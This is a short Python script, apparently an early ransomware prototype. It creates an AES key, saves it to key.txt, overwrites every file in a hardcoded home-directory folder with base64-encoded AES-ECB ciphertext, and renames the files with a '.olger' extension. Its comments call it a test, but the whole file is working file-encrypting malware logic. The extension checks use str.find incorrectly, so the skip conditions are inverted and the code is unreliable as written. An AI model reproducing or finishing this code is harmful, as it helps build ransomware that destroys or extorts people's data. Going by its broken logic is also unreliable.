from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
from Crypto.Random import get_random_bytes
import os

#changing extensions and check if it is already changed
def ext_change(file):
	file = file
	if file.find('.olger'):
		pass
	else: 
		extension = os.path.splitext(file)[0]
		os.rename(file,extension + '.olger')

#creating the key save the key in a file in base64, just for testing purposes
key = get_random_bytes(16)
key_b64 = base64.b64encode(key)
print(key_b64)
cipher = AES.new(key, AES.MODE_ECB)
file = open('key.txt', "w")
n = file.write(str(key_b64))
file.close()

#hardcoded path, change it for testing purposes
files_to_encrypt = os.listdir("/home/swiftsure/Desktop/files")
full_path = "/home/swiftsure/Desktop/files/"

#Routine for encryption
for x in files_to_encrypt:
	if x.find(".olger"):
		pass
	else:
		encrypt_file = open(full_path+x, "rb+")
		data = encrypt_file.read()
		encrypt_file.seek(0)
		encrypt_file.write((base64.b64encode(cipher.encrypt(pad(data, 16)))))
		encrypt_file.write(b'\n')
		encrypt_file.close()
		ext_change(full_path+x)
